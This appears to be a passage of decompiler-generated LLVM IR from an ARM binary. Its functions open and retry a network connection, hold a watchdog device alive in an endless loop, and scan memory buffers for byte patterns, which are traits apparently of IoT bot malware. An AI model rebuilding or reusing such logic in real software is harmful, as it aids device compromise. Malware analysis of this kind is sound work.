  br i1 %v2_d270, label %dec_label_pc_d308, label %dec_label_pc_d278.preheader

dec_label_pc_d48c:                                ; preds = %dec_label_pc_d468
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d494 = call i32 @function_10f18(i32 %v1_cf78, i32 0)
  %v7_d498 = icmp eq i32 %v2_d494, -1
  store i32 %v2_d494, i32* @r4, align 4
  br i1 %v7_d498, label %bb140, label %.thread12

bb140:                                            ; preds = %dec_label_pc_d48c
  store i32 9, i32* %r1.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d48c, %bb140
  store i32 ptrtoint (i32* @global_var_d4ac.66 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d498, i32 ptrtoint (i32* @global_var_110d8.65 to i32))
  %v0_d4ac = load i32, i32* @r4, align 4
  %v1_d4b0 = call i32 @function_1130c(i32 %v0_d4ac)
  br label %dec_label_pc_d4b4

dec_label_pc_d4b4:                                ; preds = %dec_label_pc_d314, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d4bc = call i32 @function_10f18(i32 %v2_d340, i32 0)
  %v7_d4c0 = icmp eq i32 %v2_d4bc, -1
  store i32 %v2_d4bc, i32* %sl.global-to-local, align 4
  br i1 %v7_d4c0, label %dec_label_pc_d5dc, label %dec_label_pc_d4cc

dec_label_pc_d4cc:                                ; preds = %dec_label_pc_d4b4
  %v1_d4d0 = call i32 @function_1030c(i32 18)
  %v1_d4d8 = call i32 @function_1030c(i32 19)
  store i32 %v2_d4e0, i32* %r1.global-to-local, align 4
  %v3_d4e8 = call i32 @function_10248(i32 18, i32* nonnull %stack_var_-44)
  store i32 %v2_d4ec, i32* %r1.global-to-local, align 4
  store i32 %v3_d4e8, i32* @r6, align 4
  %v3_d4f8 = call i32 @function_10248(i32 19, i32* nonnull %stack_var_-48)
  store i32 %v3_d4f8, i32* @r7, align 4
  store i32 %v2_d504, i32* @r4, align 4
  %v0_d50856 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v2_d504, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v1_d51457 = call i32 @function_110a4(i32 %v0_d50856)
  %tmp141 = icmp slt i32 %v1_d51457, 1
  br i1 %tmp141, label %dec_label_pc_d650, label %dec_label_pc_d520

dec_label_pc_d520:                                ; preds = %dec_label_pc_d4cc, %dec_label_pc_d508.backedge
  %v0_d55447 = phi i32 [ %v1_d514, %dec_label_pc_d508.backedge ], [ %v1_d51457, %dec_label_pc_d4cc ]
  %v3_d524 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d524, i32* @r5, align 4
  %v5_d52c = icmp slt i32 %v0_d55447, %v3_d524
  br i1 %v5_d52c, label %dec_label_pc_d53c, label %dec_label_pc_d590.lr.ph

dec_label_pc_d590.lr.ph:                          ; preds = %dec_label_pc_d520
  %v1_d58839 = add i32 %v0_d55447, -1
  store i32 %v1_d58839, i32* %r1.global-to-local, align 4
  %v0_d590.pre = load i32, i32* @r6, align 4
  %v1_d594.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d590

dec_label_pc_d53c:                                ; preds = %dec_label_pc_d588.backedge, %dec_label_pc_d520
  store i32 %v2_d0d0, i32* %r1.global-to-local, align 4
  %v3_d540 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d540, i32* @lr, align 4
  %v5_d548 = icmp slt i32 %v0_d55447, %v3_d540
  br i1 %v5_d548, label %dec_label_pc_d508.backedge, label %.thread25

dec_label_pc_d508.backedge:                       ; preds = %dec_label_pc_d570, %.thread25, %dec_label_pc_d53c
  %v0_d508 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v2_d504, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v1_d514 = call i32 @function_110a4(i32 %v0_d508)
  %tmp142 = icmp slt i32 %v1_d514, 1
  br i1 %tmp142, label %dec_label_pc_d650, label %dec_label_pc_d520

.thread25:                                        ; preds = %dec_label_pc_d53c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d55449 = icmp eq i32 %v0_d55447, 0
  br i1 %v2_d55449, label %dec_label_pc_d508.backedge, label %dec_label_pc_d55c.lr.ph

dec_label_pc_d55c.lr.ph:                          ; preds = %.thread25
  %v0_d55c.pre = load i32, i32* @r7, align 4
  %v1_d560.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d55c

dec_label_pc_d55c:                                ; preds = %dec_label_pc_d570, %dec_label_pc_d55c.lr.ph
  %v0_d554.in = phi i32 [ %v0_d55447, %dec_label_pc_d55c.lr.ph ], [ %v0_d554, %dec_label_pc_d570 ]
  %v0_d570 = phi i32 [ 0, %dec_label_pc_d55c.lr.ph ], [ %v1_d570, %dec_label_pc_d570 ]
  %v1_d55c = phi i32 [ 0, %dec_label_pc_d55c.lr.ph ], [ %v1_d55c86, %dec_label_pc_d570 ]
  %v0_d554 = add i32 %v0_d554.in, -1
  %v2_d55c = add i32 %v1_d55c, %v0_d55c.pre
  %v3_d55c = inttoptr i32 %v2_d55c to i8*
  %v4_d55c = load i8, i8* %v3_d55c, align 1
  %v6_d55c = zext i8 %v4_d55c to i32
  store i32 %v6_d55c, i32* %r2.global-to-local, align 4
  %v2_d560 = add i32 %v0_d570, %v1_d560.pre
  %v3_d560 = inttoptr i32 %v2_d560 to i8*
  %v4_d560 = load i8, i8* %v3_d560, align 1
  %v6_d560 = zext i8 %v4_d560 to i32
  store i32 %v6_d560, i32* %r3.global-to-local, align 4
  %v9_d564 = icmp eq i8 %v4_d560, %v4_d55c
  br i1 %v9_d564, label %dec_label_pc_d5ac, label %bb143

bb143:                                            ; preds = %dec_label_pc_d55c
  br label %dec_label_pc_d570

dec_label_pc_d570:                                ; preds = %bb143, %dec_label_pc_d5ac
  %v1_d55c86 = phi i32 [ %v1_d5ac, %dec_label_pc_d5ac ], [ 0, %bb143 ]
  %v1_d570 = add i32 %v0_d570, 1
  store i32 %v1_d570, i32* %r1.global-to-local, align 4
  %v2_d554 = icmp eq i32 %v0_d554, 0
  br i1 %v2_d554, label %dec_label_pc_d508.backedge, label %dec_label_pc_d55c

dec_label_pc_d578:                                ; preds = %dec_label_pc_d590
  %v1_d578 = add i32 %v1_d590, 1
  store i32 %v1_d578, i32* @lr, align 4
  %v9_d57c = icmp eq i32 %v3_d524, %v1_d578
  br i1 %v9_d57c, label %dec_label_pc_d5b8, label %dec_label_pc_d588.backedge

dec_label_pc_d588.backedge:                       ; preds = %dec_label_pc_d578, %dec_label_pc_d5a4
  %v1_d59077 = phi i32 [ 0, %dec_label_pc_d5a4 ], [ %v1_d578, %dec_label_pc_d578 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d588 = add i32 %v0_d588, -1
  store i32 %v1_d588, i32* %r1.global-to-local, align 4
  %v2_d588 = icmp eq i32 %v0_d588, 0
  br i1 %v2_d588, label %dec_label_pc_d53c, label %dec_label_pc_d590

dec_label_pc_d590:                                ; preds = %dec_label_pc_d588.backedge, %dec_label_pc_d590.lr.ph
  %v0_d588 = phi i32 [ %v1_d58839, %dec_label_pc_d590.lr.ph ], [ %v1_d588, %dec_label_pc_d588.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d590.lr.ph ], [ %storemerge, %dec_label_pc_d588.backedge ]
  %v1_d590 = phi i32 [ 0, %dec_label_pc_d590.lr.ph ], [ %v1_d59077, %dec_label_pc_d588.backedge ]
  %v2_d590 = add i32 %v1_d590, %v0_d590.pre
  %v3_d590 = inttoptr i32 %v2_d590 to i8*
  %v4_d590 = load i8, i8* %v3_d590, align 1
  %v6_d590 = zext i8 %v4_d590 to i32
  store i32 %v6_d590, i32* %r2.global-to-local, align 4
  %v2_d594 = add i32 %storemerge.in, %v1_d594.pre
  %v3_d594 = inttoptr i32 %v2_d594 to i8*
  %v4_d594 = load i8, i8* %v3_d594, align 1
  %v6_d594 = zext i8 %v4_d594 to i32
  store i32 %v6_d594, i32* %r3.global-to-local, align 4
  %v9_d598 = icmp eq i8 %v4_d594, %v4_d590
  br i1 %v9_d598, label %dec_label_pc_d578, label %dec_label_pc_d5a4

dec_label_pc_d5a4:                                ; preds = %dec_label_pc_d590
  br label %dec_label_pc_d588.backedge

dec_label_pc_d5ac:                                ; preds = %dec_label_pc_d55c
  %v1_d5ac = add i32 %v1_d55c, 1
  %v9_d5b0 = icmp eq i32 %v3_d540, %v1_d5ac
  br i1 %v9_d5b0, label %dec_label_pc_d5b8, label %dec_label_pc_d570

dec_label_pc_d5b8:                                ; preds = %dec_label_pc_d578, %dec_label_pc_d5ac
  %v1_d5bc = call i32 @function_1026c(i32 18)
  %v1_d5c4 = call i32 @function_1026c(i32 19)
  %v0_d5c8 = load i32, i32* %sl.global-to-local, align 4
  %v1_d5cc = call i32 @function_1130c(i32 %v0_d5c8)
  %v0_d5d0 = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d5d8 = call i32 @function_110d8(i32 %v0_d5d0, i32 9)
  br label %dec_label_pc_d5dc

dec_label_pc_d5dc:                                ; preds = %dec_label_pc_d4b4, %dec_label_pc_d650, %dec_label_pc_d5b8
  store i32 %v2_d340, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d5e4 = call i32 @function_108e0()
  store i32 %v2_d390, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d5f4 = call i32 @function_108e0()
  %v1_d5fc = call i32 @function_133f8(i32 1)
  store i32 %v2_d318, i32* @r7, align 4
  %v0_d604 = load i32, i32* @r8, align 4
  store i32 %v0_d604, i32* @sl, align 4
  br label %dec_label_pc_d268.backedge

dec_label_pc_d60c:                                ; preds = %dec_label_pc_d144
  %v1_d614 = call i32 @function_c93c(i32 42448)
  %v2_d618 = icmp eq i32 %v1_d614, 0
  br i1 %v2_d618, label %dec_label_pc_d620, label %dec_label_pc_d154

dec_label_pc_d620:                                ; preds = %dec_label_pc_d60c
  %v1_d624 = call i32 @function_c93c(i32 20480)
  %v2_d628 = icmp eq i32 %v1_d624, 0
  br i1 %v2_d628, label %dec_label_pc_d630, label %dec_label_pc_d154

dec_label_pc_d630:                                ; preds = %dec_label_pc_d620
  %v1_d638 = call i32 @function_c93c(i32 34254)
  %v2_d63c = icmp eq i32 %v1_d638, 0
  br i1 %v2_d63c, label %dec_label_pc_d644, label %dec_label_pc_d154

dec_label_pc_d644:                                ; preds = %dec_label_pc_d630
  %v0_d644 = load i32, i32* @r5, align 4
  %v1_d648 = call i32 @function_c93c(i32 %v0_d644)
  br label %dec_label_pc_d154

dec_label_pc_d650:                                ; preds = %dec_label_pc_d508.backedge, %dec_label_pc_d4cc
  %v1_d654 = call i32 @function_1026c(i32 18)
  %v1_d65c = call i32 @function_1026c(i32 19)
  %v0_d660 = load i32, i32* %sl.global-to-local, align 4
  %v1_d664 = call i32 @function_1130c(i32 %v0_d660)
  br label %dec_label_pc_d5dc

; uselistorder directives
  uselistorder i32 %v1_d5ac, { 1, 0 }
  uselistorder i32 %v1_d570, { 1, 0 }
  uselistorder i32 %v1_d55c, { 1, 0 }
  uselistorder i32 %v0_d570, { 1, 0 }
  uselistorder i32 %v1_d514, { 1, 0 }
  uselistorder i32 %v2_d4bc, { 1, 0 }
  uselistorder i1 %v7_d498, { 1, 0 }
  uselistorder i32 %v2_d494, { 1, 0 }
  uselistorder i32 %v2_d26c, { 1, 0 }
  uselistorder i32 %stack_var_-8484.1.be, { 1, 0 }
  uselistorder i32 %v3_d3ec, { 1, 2, 0 }
  uselistorder i32 %v2_d2fc, { 1, 0 }
  uselistorder i32 %v1_d29c, { 0, 1, 5, 4, 3, 2, 6, 9, 8, 7 }
  uselistorder i32 %v1_d278, { 2, 1, 0, 3 }
  uselistorder i32 %v3_d23c, { 1, 2, 0 }
  uselistorder i32 %v3_d204, { 1, 2, 0 }
  uselistorder i32 %v3_d1d0, { 2, 1, 0 }
  uselistorder i32 %v3_d198, { 1, 2, 0 }
  uselistorder i32 %v3_d160, { 2, 1, 0 }
  uselistorder i32 %v3_d118, { 2, 1, 0 }
  uselistorder i32 %stack_var_-8484.0, { 1, 0 }
  uselistorder i32 %v2_d504, { 1, 0, 2 }
  uselistorder i32 %v2_d390, { 1, 0, 2 }
  uselistorder i32 %v3_d010, { 1, 0 }
  uselistorder i32 %v2_cfdc, { 2, 0, 1 }
  uselistorder i32 %v1_cf78, { 3, 2, 0, 4, 6, 5, 8, 7, 9, 10, 1, 11, 12, 13 }
  uselistorder i32 %storemerge96, { 1, 0 }
  uselistorder i32 %v0_cee8, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 0, 7, 6, 2, 1, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 52, 51, 53, 54, 55, 56 }
  uselistorder i32 (i32*)* @function_1164c, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 20480, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_11508, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_11070, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_212dc.63, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_d5dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d5b8, { 1, 0 }
  uselistorder label %dec_label_pc_d588.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d570, { 1, 0 }
  uselistorder label %dec_label_pc_d520, { 1, 0 }
  uselistorder label %dec_label_pc_d4b4, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d268.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d448, { 1, 0 }
  uselistorder label %dec_label_pc_d278, { 1, 0 }
  uselistorder label %dec_label_pc_d278.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_d230, { 1, 0 }
  uselistorder label %dec_label_pc_d1f8, { 1, 0 }
  uselistorder label %dec_label_pc_d1c4, { 1, 0 }
  uselistorder label %dec_label_pc_d18c, { 1, 0 }
  uselistorder label %dec_label_pc_d154, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_d144, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @function_d67c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d67c:
  store i32 ptrtoint (i32* @global_var_d7f4.68 to i32), i32* inttoptr (i32 127116 to i32*), align 4
  ret i32 %arg1
}

define i32 @function_d694(i32 %arg1) local_unnamed_addr {
dec_label_pc_d694:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_d694 = load i32, i32* @r6, align 4
  %v12_d694 = load i32, i32* @r7, align 4
  %v15_d694 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d6b0 = call i32 @function_11aec(i32 2, i32 1, i32 0)
  store i32 %v3_d6b0, i32* %r0.global-to-local, align 4
  store i32 127108, i32* @r6, align 4
  %v7_d6b8 = icmp eq i32 %v3_d6b0, -1
  store i32 %v3_d6b0, i32* inttoptr (i32 127108 to i32*), align 4
  br i1 %v7_d6b8, label %dec_label_pc_d694.dec_label_pc_d770_crit_edge, label %dec_label_pc_d6c4

dec_label_pc_d694.dec_label_pc_d770_crit_edge:    ; preds = %dec_label_pc_d694
  %v1_d778.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d770

dec_label_pc_d6c4:                                ; preds = %dec_label_pc_d694
  %v2_d6c4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d6c4, i32* @r3, align 4
  %v0_d6c8 = load i32, i32* @r4, align 4
  store i32 4, i32* %r5.global-to-local, align 4
  %v0_d6d8 = load i32, i32* %r0.global-to-local, align 4
  %v5_d6d8 = call i32 @function_11aa8(i32 %v0_d6d8, i32 %v0_d6c8, i32 2, i32 %v2_d6c4, i32 4)
  store i32 %v5_d6d8, i32* %r0.global-to-local, align 4
  %v0_d6dc = load i32, i32* @r6, align 4
  %v1_d6dc = inttoptr i32 %v0_d6dc to i32*
  %v2_d6dc = load i32, i32* %v1_d6dc, align 4
  store i32 %v2_d6dc, i32* %r4.global-to-local, align 4
  store i32 %v2_d6dc, i32* %r0.global-to-local, align 4
  %v2_d6ec = call i32 @function_11140(i32 %v2_d6dc, i32 3)
  %v0_d6f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v2_d6dc, i32* %r0.global-to-local, align 4
  %v2_d6fc = call i32 @function_11140(i32 %v2_d6dc, i32 %v0_d6f0)
  store i32 %v2_d6fc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @1 to i32), i32* @r8, align 4
  %v0_d72c = call i32 @function_11734()
  store i32 %v0_d72c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v2_d734 = inttoptr i32 %v0_d72c to i32*
  store i32 0, i32* %v2_d734, align 4
  %v2_d738 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d738, i32* @r5, align 4
  store i32 %v0_d72c, i32* %r4.global-to-local, align 4
  %v0_d748 = load i32, i32* @r6, align 4
  %v1_d748 = inttoptr i32 %v0_d748 to i32*
  %v2_d748 = load i32, i32* %v1_d748, align 4
  store i32 %v2_d748, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d754 = call i32 @function_1189c(i32 %v2_d748, i32 %v2_d738, i32 16)
  store i32 %v3_d754, i32* %r0.global-to-local, align 4
  %v7_d758 = icmp eq i32 %v3_d754, -1
  br i1 %v7_d758, label %dec_label_pc_d77c, label %dec_label_pc_d760

dec_label_pc_d760:                                ; preds = %dec_label_pc_d6c4
  %v2_d768 = load i32, i32* inttoptr (i32 127108 to i32*), align 4
  store i32 %v2_d768, i32* %r0.global-to-local, align 4
  %v2_d76c = call i32 @function_11988(i32 %v2_d768, i32 1)
  store i32 %v2_d76c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d770

dec_label_pc_d770:                                ; preds = %dec_label_pc_d694.dec_label_pc_d770_crit_edge, %dec_label_pc_d788, %dec_label_pc_d760
  %v1_d778 = phi i32 [ %v1_d778.pre, %dec_label_pc_d694.dec_label_pc_d770_crit_edge ], [ %v1_d7cc, %dec_label_pc_d788 ], [ %v2_d76c, %dec_label_pc_d760 ]
  store i32 %v9_d694, i32* @r6, align 4
  store i32 %v12_d694, i32* @r7, align 4
  store i32 %v15_d694, i32* @r8, align 4
  ret i32 %v1_d778

dec_label_pc_d77c:                                ; preds = %dec_label_pc_d6c4
  %v0_d77c = load i32, i32* %r4.global-to-local, align 4
  %v1_d77c = inttoptr i32 %v0_d77c to i32*
  %v2_d77c = load i32, i32* %v1_d77c, align 4
  %v7_d780 = icmp eq i32 %v2_d77c, 99
  br i1 %v7_d780, label %dec_label_pc_d7d4, label %dec_label_pc_d788

dec_label_pc_d788:                                ; preds = %dec_label_pc_d7d4, %bb, %dec_label_pc_d77c
  store i32 9510, i32* @r4, align 4
  %v0_d7a0 = load i32, i32* @r6, align 4
  %v1_d7a0 = inttoptr i32 %v0_d7a0 to i32*
  %v2_d7a0 = load i32, i32* %v1_d7a0, align 4
  store i32 %v2_d7a0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d7b0 = call i32 @function_118d4(i32 %v2_d7a0, i32 %v2_d738, i32 16)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_d7b8 = call i32 @function_133f8(i32 5)
  store i32 %v1_d7b8, i32* %r0.global-to-local, align 4
  %v0_d7bc = load i32, i32* @r6, align 4
  %v1_d7bc = inttoptr i32 %v0_d7bc to i32*
  %v2_d7bc = load i32, i32* %v1_d7bc, align 4
  store i32 %v2_d7bc, i32* %r0.global-to-local, align 4
  %v1_d7c0 = call i32 @function_1130c(i32 %v2_d7bc)
  %v0_d7c4 = load i32, i32* @r4, align 4
  store i32 %v0_d7c4, i32* %r0.global-to-local, align 4
  %v1_d7c8 = call i32 @function_c93c(i32 %v0_d7c4)
  store i32 %v1_d7c8, i32* %r0.global-to-local, align 4
  %v1_d7cc = call i32 @function_d694(i32 %v1_d7c8)
  store i32 %v1_d7cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d770

dec_label_pc_d7d4:                                ; preds = %dec_label_pc_d77c
  %v0_d7d4 = load i32, i32* @r8, align 4
  %v1_d7d4 = inttoptr i32 %v0_d7d4 to i8*
  %v2_d7d4 = load i8, i8* %v1_d7d4, align 1
  %v3_d7d4 = zext i8 %v2_d7d4 to i32
  %v1_d7d8 = load i32, i32* @r7, align 4
  %v9_d7d8 = icmp eq i32 %v3_d7d4, %v1_d7d8
  br i1 %v9_d7d8, label %dec_label_pc_d788, label %bb

bb:                                               ; preds = %dec_label_pc_d7d4
  %v2_d7e0 = trunc i32 %v1_d7d8 to i8
  store i8 %v2_d7e0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @1, i32 0, i32 0), align 1
  br label %dec_label_pc_d788

; uselistorder directives
  uselistorder i32 %v1_d7cc, { 1, 0 }
  uselistorder i32 %v2_d738, { 1, 0, 2 }
  uselistorder i32 %v2_d6dc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_d6b0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 0, 2, 1, 3, 5, 4, 7, 6, 9, 8, 10, 12, 11, 13, 14, 16, 17, 18, 15 }
  uselistorder i32 (i32)* @function_c93c, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_11988, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1189c, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder [4 x i8]* @1, { 1, 0 }
  uselistorder i32* inttoptr (i32 127108 to i32*), { 1, 0 }
  uselistorder label %dec_label_pc_d788, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d770, { 1, 2, 0 }
}

define i32 @function_d7e8(i32 %arg1, i32 %arg2, i64* %arg3) local_unnamed_addr {
dec_label_pc_d7e8:
  %v0_d7e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d7e8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_d7e8
  %v2_d7e8 = load i32, i32* @r4, align 4
  %v4_d7e8 = mul i32 %v2_d7e8, 2
  %v5_d7e8 = and i32 %v4_d7e8, %arg2
  call void @__pseudo_branch(i32 %v5_d7e8)
  %v0_d7ec.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d7ec.pr, label %bb2, label %.thread1

bb2:                                              ; preds = %bb
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_d7e8, %bb, %bb2
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread1, { 2, 1, 0 }
}

define i32 @function_d7f4() local_unnamed_addr {
dec_label_pc_d7f4:
  %v2_d7fc = call i32 @function_e368(i32 ptrtoint ([22 x i8]* @global_var_16680.74 to i32))
  store i32 %v2_d7fc, i32* @r6, align 4
  %v3_d800 = icmp eq i32 %v2_d7fc, 0
  br i1 %v3_d800, label %dec_label_pc_d858, label %dec_label_pc_d808

dec_label_pc_d808:                                ; preds = %dec_label_pc_d7f4
  %v1_d808 = add i32 %v2_d7fc, 4
  %v2_d808 = inttoptr i32 %v1_d808 to i32*
  %v3_d808 = load i32, i32* %v2_d808, align 4
  store i32 %v3_d808, i32* @r4, align 4
  %v0_d80c = call i32 @function_e0d0()
  %v0_d810 = load i32, i32* @r6, align 4
  %v1_d810 = inttoptr i32 %v0_d810 to i8*
  %v2_d810 = load i8, i8* %v1_d810, align 1
  %v3_d810 = zext i8 %v2_d810 to i32
  %v2_d814 = call i32 @function_10ea4(i32 %v0_d80c, i32 %v3_d810)
  store i32 ptrtoint (i16** @global_var_212e4.76 to i32), i32* @r5, align 4
  %v0_d81c = load i32, i32* @r4, align 4
  %v4_d81c = mul nuw nsw i32 %v3_d810, 4
  %v5_d81c = add i32 %v0_d81c, %v4_d81c
  %v6_d81c = inttoptr i32 %v5_d81c to i32*
  %v7_d81c = load i32, i32* %v6_d81c, align 4
  %v0_d820 = load i32, i32* @r6, align 4
  store i32 %v7_d81c, i32* @global_var_212e8.77, align 4
  %v1_d828 = call i32 @function_e340(i32 %v0_d820)
  %v1_d830 = call i32 @function_1030c(i32 1)
  %v3_d83c = call i32 @function_10248(i32 1, i32* null)
  %v4_d83c = inttoptr i32 %v3_d83c to i16*
  %v3_d840 = load i16, i16* %v4_d83c, align 2
  store i16 %v3_d840, i16* bitcast (i32* @global_var_212e6.78 to i16*), align 4
  %v1_d84c = call i32 @function_1026c(i32 1)
  br label %dec_label_pc_d850

dec_label_pc_d850:                                ; preds = %dec_label_pc_d858, %dec_label_pc_d808
  %v1_d854 = phi i32 [ %v2_d85c, %dec_label_pc_d858 ], [ %v1_d84c, %dec_label_pc_d808 ]
  ret i32 %v1_d854

dec_label_pc_d858:                                ; preds = %dec_label_pc_d7f4
  store i32 ptrtoint ([15 x i8]* @global_var_16698.80 to i32), i32* @r0, align 4
  %v2_d85c = call i32 @function_11874(i32 ptrtoint ([15 x i8]* @global_var_16698.80 to i32))
  store i32 %v2_d85c, i32* @global_var_212e8.77, align 4
  br label %dec_label_pc_d850

; uselistorder directives
  uselistorder i32 %v2_d85c, { 1, 0 }
}

define i32 @function_d878(i32 %arg1) local_unnamed_addr {
dec_label_pc_d878:
  %stack_var_-20 = alloca i32, align 4
  %v3_d878 = load i32, i32* @r4, align 4
  %v6_d878 = load i32, i32* @r5, align 4
  %v0_d880 = call i32 @function_10ffc()
  %v7_d884 = icmp eq i32 %v0_d880, -1
  %. = zext i1 %v7_d884 to i32
  %tmp11 = icmp slt i32 %v0_d880, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_d8a0 = icmp eq i32 %storemerge4, 0
  store i32 %v0_d880, i32* @global_var_1f258.82, align 4
  br i1 %v2_d8a0, label %dec_label_pc_d8b8, label %dec_label_pc_d8ac

dec_label_pc_d8ac:                                ; preds = %dec_label_pc_d878
  store i32 %v3_d878, i32* @r4, align 4
  store i32 %v6_d878, i32* @r5, align 4
  ret i32 %v0_d880

dec_label_pc_d8b8:                                ; preds = %dec_label_pc_d878
  store i32 1, i32* %stack_var_-20, align 4
  %v1_d8c4 = call i32 @function_1030c(i32 23)
  %v1_d8cc = call i32 @function_1030c(i32 24)
  %v0_d8d0 = load i32, i32* @r5, align 4
  %v2_d8d8 = inttoptr i32 %v0_d8d0 to i32*
  %v3_d8d8 = call i32 @function_10248(i32 23, i32* %v2_d8d8)
  %v2_d8e0 = call i32 @function_10f18(i32 %v3_d8d8, i32 2)
  %v7_d8e4 = icmp eq i32 %v2_d8e0, -1
  store i32 %v2_d8e0, i32* @r4, align 4
  br i1 %v7_d8e4, label %dec_label_pc_d92c, label %dec_label_pc_d8f0

dec_label_pc_d8f0:                                ; preds = %dec_label_pc_d92c, %dec_label_pc_d8b8
  %v0_d8fc = phi i32 [ %v2_d93c, %dec_label_pc_d92c ], [ %v2_d8e0, %dec_label_pc_d8b8 ]
  %v2_d900 = ptrtoint i32* %stack_var_-20 to i32
  %v3_d904 = call i32 @function_11280(i32 %v0_d8fc, i32 -2147199228, i32 %v2_d900)
  br label %dec_label_pc_d908

dec_label_pc_d908:                                ; preds = %dec_label_pc_d908, %dec_label_pc_d8f0
  %v0_d914 = load i32, i32* @r4, align 4
  %v3_d91c = call i32 @function_11280(i32 %v0_d914, i32 -2147199227, i32 0)
  %v1_d924 = call i32 @function_133f8(i32 10)
  br label %dec_label_pc_d908

dec_label_pc_d92c:                                ; preds = %dec_label_pc_d8b8
  %v0_d92c = load i32, i32* @r5, align 4
  %v2_d934 = inttoptr i32 %v0_d92c to i32*
  %v3_d934 = call i32 @function_10248(i32 24, i32* %v2_d934)
  %v2_d93c = call i32 @function_10f18(i32 %v3_d934, i32 2)
  %v3_d940 = icmp eq i32 %v2_d93c, -1
  store i32 %v2_d93c, i32* @r4, align 4
  br i1 %v3_d940, label %dec_label_pc_d94c, label %dec_label_pc_d8f0

dec_label_pc_d94c:                                ; preds = %dec_label_pc_d92c
  %v1_d950 = call i32 @function_1026c(i32 23)
  %v1_d958 = call i32 @function_1026c(i32 24)
  %v0_d95c = load i32, i32* @r5, align 4
  %v1_d960 = call i32 @function_13340(i32 %v0_d95c)
  %v0_d964 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d964, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_d94c
  %v2_d964 = load i32, i32* @r8, align 4
  %v8_d964 = ashr i32 %v2_d964, %arg1
  %v9_d964 = and i32 %v8_d964, 2
  call void @__pseudo_branch(i32 %v9_d964)
  br label %bb15

